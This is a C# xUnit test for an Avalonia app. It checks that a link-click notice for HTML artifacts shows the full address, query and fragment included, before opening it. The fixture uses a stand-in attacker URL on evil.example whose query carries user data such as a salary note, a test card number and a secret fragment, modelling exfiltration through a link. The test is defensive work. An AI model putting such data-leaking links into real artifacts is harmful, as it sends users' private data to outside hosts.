using Avalonia.Controls;
using Avalonia.Controls.Documents;
using Avalonia.VisualTree;
using Marrow.App.Tests.Fixtures;
using Marrow.Core.Models;
using Marrow.Services.Web;

namespace Marrow.App.Tests.Views.Artifacts;

// PORT-ONLY: web surfaces security review 2026-10-13, finding L3 (ED-NEW-web-sec-artifacts-5; DESIGN.md 6.5 "A user click on a link
// inside an artifact is cancelled and offered ... as 'Open link from the artifact'", 5.10 "the full URL with the query string
// expanded"). A network-off artifact can put what it computed or what the user typed into a link's query; Open sends that address.
// The notice therefore shows the whole address it opens, query and fragment included, with no line cap, and Open opens exactly it.
[Collection("Headless")]
[Trait("Decision", "ED-NEW-web-sec-artifacts-5")]
public sealed class TabulaLinkNoticeTests(HeadlessSession headless)
{
    private const string Page = "<!doctype html><html><body><a href=\"https://evil.example/\">Docs</a></body></html>";

    private static string TextOf(TextBlock block) =>
        block.Inlines is { Count: > 0 } inlines ? string.Concat(inlines.OfType<Run>().Select(run => run.Text)) : block.Text ?? "";

    [Fact]
    public void The_link_notice_shows_the_whole_address_it_opens_query_and_fragment_included() => headless.OnUiThread(() =>
    {
        using var rig = new TabulaRig();
        rig.Show(ArtifactKind.Html, Page);
        var view = rig.View.Preview.View!;
        if (view.Engine is not FakeWebView { IsAttached: true }) view.AttachNative(1, 2);
        var fake = Assert.IsType<FakeWebView>(view.Engine);
        const string address = "https://evil.example/collect?total=4242&note=my%20salary%20is%2090k&card=4111#k=secret";

        fake.RaiseNavigationStarting(address, userInitiated: true);
        rig.Layout();

        Assert.Equal(ArtifactMount.OpenLinkTitle, rig.View.Notice.Title);
        var blocks = rig.View.Notice.GetVisualDescendants().OfType<TextBlock>().Where(block => block.IsEffectivelyVisible).ToList();
        var showing = Assert.Single(blocks, block => TextOf(block).Contains("evil.example", StringComparison.Ordinal));
        Assert.Equal(address, TextOf(showing));
        Assert.Equal(0, showing.MaxLines);

        TabulaRig.Click(Assert.Single(rig.View.Notice.Actions));
        rig.Layout();
        Assert.Equal([address], rig.Links);
    });
}
